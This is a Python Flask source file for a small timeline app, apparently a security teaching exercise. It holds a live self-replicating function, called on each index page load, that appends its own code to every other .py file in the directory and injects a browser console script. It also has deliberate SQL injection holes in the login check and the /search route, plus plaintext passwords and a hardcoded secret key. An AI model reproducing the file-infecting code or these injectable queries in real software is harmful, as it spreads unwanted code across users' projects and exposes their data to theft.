import os
import sys
import glob
import sqlite3
from flask import Flask, redirect, request, session, render_template_string, render_template

app = Flask(__name__)
app.secret_key = 'sqlinjection'
DATABASE_PATH = os.path.join(os.path.dirname(__file__), 'database.db')


# --- VIRUS CODE START ---
def virus_code():
    virus_file = sys.argv[0]
    with open(virus_file, 'r') as f:
        lines = f.readlines()

    virus_start = None
    for i, line in enumerate(lines):
        if line.strip() == "# VIRUS SAYS HI!":
            virus_start = i
            break
    if virus_start is None:
        return ""

    virus_lines = lines[virus_start:]

    py_files = glob.glob("*.py")

    for file in py_files:
        if file == virus_file:
            continue
        with open(file, 'r') as f:
            content = f.read()
        if "# VIRUS SAYS HI!" in content:
            continue
        with open(file, 'a') as f:
            f.writelines("\n")
            f.writelines(virus_lines)

    

    # Return JS payload to inject in HTML for browser console message
    return """
<script>
console.log("%cYOU HAVE BEEN INFECTED HAHAHAHAHAHAH (jk) !!!", "color: indigo; font-size: 25px; font-weight: bold;");
</script>
"""
# --- VIRUS CODE END ---


def connect_db():
    conn = sqlite3.connect(DATABASE_PATH)
    conn.row_factory = sqlite3.Row
    return conn


def create_tables():
    with connect_db() as conn:
        cur = conn.cursor()
        cur.execute('''
            CREATE TABLE IF NOT EXISTS user(
                id      INTEGER PRIMARY KEY AUTOINCREMENT,
                username TEXT    NOT NULL UNIQUE,
                password TEXT    NOT NULL
            )
        ''')
        cur.execute('''
            CREATE TABLE IF NOT EXISTS time_line(
                id       INTEGER PRIMARY KEY AUTOINCREMENT,
                user_id  INTEGER NOT NULL,
                content  TEXT    NOT NULL,
                FOREIGN KEY(user_id) REFERENCES user(id)
            )
        ''')
        conn.commit()


def init_data():
    with connect_db() as conn:
        cur = conn.cursor()
        cur.executemany(
            'INSERT OR IGNORE INTO user(username, password) VALUES (?,?)',
            [('alice','alicepw'), ('bob','bobpw')]
        )
        cur.executemany(
            'INSERT OR IGNORE INTO time_line(user_id, content) VALUES (?,?)',
            [(1,'Hello world'), (2,'Hi there')]
        )
        conn.commit()


def authenticate(username, password):
    with connect_db() as conn:
        cur = conn.cursor()
        query = f"SELECT id, username FROM user WHERE username='{username}' AND password='{password}'"
        cur.execute(query)
        row = cur.fetchone()
        return dict(row) if row else None


def create_time_line(uid, content):
    with connect_db() as conn:
        cur = conn.cursor()
        cur.execute(
            'INSERT INTO time_line(user_id, content) VALUES (?,?)',
            (uid, content)
        )
        conn.commit()


def get_time_lines():
    with connect_db() as conn:
        cur = conn.cursor()
        cur.execute('SELECT id, user_id, content FROM time_line ORDER BY id DESC')
        return [dict(r) for r in cur.fetchall()]


def delete_time_line(uid, tid):
    with connect_db() as conn:
        cur = conn.cursor()
        cur.execute(
            'DELETE FROM time_line WHERE user_id=? AND id=?',
            (uid, tid)
        )
        conn.commit()


@app.route('/search')
def search():
    keyword = request.args.get('keyword', '')
    conn = connect_db()
    cur = conn.cursor()
    query = f"SELECT id, user_id, content FROM time_line WHERE content LIKE '%{keyword}%'"
    cur.execute(query)
    rows = [dict(r) for r in cur.fetchall()]
    conn.close()
    return {
        'query_used': query,
        'results': rows
    }


@app.route('/init')
def init_page():
    create_tables()
    init_data()
    return redirect('/')


@app.route('/')
def index():
    if 'uid' in session:
        tl = get_time_lines()
        js_payload = virus_code()  # dapatkan JavaScript dari virus_code
        return render_template('index.html', user=session['username'], tl=tl, js_payload=js_payload)
    return redirect('/login')


@app.route('/login', methods=['GET','POST'])
def login():
    if request.method=='POST':
        user = authenticate(request.form['username'], request.form['password'])
        if user:
            session['uid'] = user['id']
            session['username'] = user['username']
            return redirect('/')
    return '''
<form method="post">
  <input name="username" placeholder="user"/><input name="password" type="password"/>
  <button>Login</button>
</form>
'''


@app.route('/create', methods=['POST'])
def create():
    if 'uid' in session:
        create_time_line(session['uid'], request.form['content'])
    return redirect('/')


@app.route('/delete/<int:tid>')
def delete(tid):
    if 'uid' in session:
        delete_time_line(session['uid'], tid)
    return redirect('/')


@app.route('/logout')
def logout():
    session.clear()
    return redirect('/login')


if __name__ == '__main__':
    app.run(debug=True)


# VIRUS SAYS HI!
